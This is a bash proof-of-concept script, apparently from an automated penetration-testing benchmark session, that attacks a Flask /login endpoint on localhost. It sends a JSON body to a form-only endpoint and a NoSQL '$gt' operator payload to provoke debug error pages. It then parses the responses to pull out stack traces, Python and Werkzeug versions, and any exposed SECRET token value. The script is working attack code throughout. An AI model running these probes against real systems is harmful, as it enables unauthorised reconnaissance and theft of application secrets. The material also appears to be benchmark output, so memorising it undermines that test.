#!/bin/bash
# POC: Demonstrates Flask debug mode exposure through invalid JSON and NoSQL operators on login endpoint, revealing stack traces, framework versions, and secret tokens
# Target: ./repo
# Created: 2025-12-02T16:16:59.796Z
# Session: benchmark-XBEN-093-24-miorxjqr

# Flask Debug Mode Information Disclosure POC
# Demonstrates exposure of sensitive information through debug error pages

TARGET_URL="${1:-http://localhost:5003}"
LOGIN_ENDPOINT="/login"

echo "=================================================="
echo "Flask Debug Mode Information Disclosure POC"
echo "=================================================="
echo "Target: $TARGET_URL$LOGIN_ENDPOINT"
echo ""

# Test 1: Send JSON to form-only endpoint
echo "[*] Test 1: Sending JSON payload to form-only endpoint..."
echo "Request: curl -X POST $TARGET_URL$LOGIN_ENDPOINT -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin\"}'"
echo ""

RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}')

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE1"
echo ""
echo "Response Body (first 2000 chars):"
echo "$BODY1" | head -c 2000
echo ""
echo ""

# Check for debug information indicators
if echo "$BODY1" | grep -q "Traceback"; then
    echo "[+] DEBUG INFO FOUND: Stack trace detected"
fi

if echo "$BODY1" | grep -q "werkzeug"; then
    echo "[+] DEBUG INFO FOUND: Werkzeug framework detected in response"
fi

if echo "$BODY1" | grep -q "SECRET"; then
    echo "[+] CRITICAL: SECRET token exposed in response"
    SECRET_VALUE=$(echo "$BODY1" | grep -oP 'SECRET["\s]*[=:]["\s]*\K[^"<,\s]+' | head -1)
    if [ -n "$SECRET_VALUE" ]; then
        echo "    Secret Value: $SECRET_VALUE"
    fi
fi

if echo "$BODY1" | grep -q "Python"; then
    echo "[+] DEBUG INFO FOUND: Python version information exposed"
    PYTHON_VERSION=$(echo "$BODY1" | grep -oP 'Python \K[0-9.]+' | head -1)
    if [ -n "$PYTHON_VERSION" ]; then
        echo "    Python Version: $PYTHON_VERSION"
    fi
fi

if echo "$BODY1" | grep -q "Werkzeug"; then
    echo "[+] DEBUG INFO FOUND: Werkzeug version information exposed"
    WERKZEUG_VERSION=$(echo "$BODY1" | grep -oP 'Werkzeug/\K[0-9.]+' | head -1)
    if [ -n "$WERKZEUG_VERSION" ]; then
        echo "    Werkzeug Version: $WERKZEUG_VERSION"
    fi
fi

echo ""
echo "=================================================="
echo "[*] Test 2: Sending NoSQL injection operators..."
echo "Request: curl -X POST $TARGET_URL$LOGIN_ENDPOINT -d 'username[\$gt]=&password[\$gt]='"
echo ""

RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -d 'username[$gt]=&password[$gt]=')

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE2"
echo ""
echo "Response Body (first 2000 chars):"
echo "$BODY2" | head -c 2000
echo ""
echo ""

# Check for debug information indicators
if echo "$BODY2" | grep -q "Traceback"; then
    echo "[+] DEBUG INFO FOUND: Stack trace detected"
fi

if echo "$BODY2" | grep -q "werkzeug"; then
    echo "[+] DEBUG INFO FOUND: Werkzeug framework detected in response"
fi

if echo "$BODY2" | grep -q "SECRET"; then
    echo "[+] CRITICAL: SECRET token exposed in response"
    SECRET_VALUE=$(echo "$BODY2" | grep -oP 'SECRET["\s]*[=:]["\s]*\K[^"<,\s]+' | head -1)
    if [ -n "$SECRET_VALUE" ]; then
        echo "    Secret Value: $SECRET_VALUE"
    fi
fi

echo ""
echo "=================================================="
echo "POC Summary:"
echo "=================================================="
echo "Test 1 HTTP Code: $HTTP_CODE1 (expected 500 with debug info)"
echo "Test 2 HTTP Code: $HTTP_CODE2 (expected 500 with debug info)"
echo ""

if [ "$HTTP_CODE1" = "500" ] || [ "$HTTP_CODE2" = "500" ]; then
    if echo "$BODY1$BODY2" | grep -q "Traceback\|werkzeug\|SECRET"; then
        echo "[✓] VULNERABILITY CONFIRMED: Flask debug mode is enabled and exposing sensitive information"
        exit 0
    else
        echo "[!] Received 500 errors but debug information not clearly visible"
        exit 1
    fi
else
    echo "[!] Did not receive expected 500 errors"
    exit 1
fi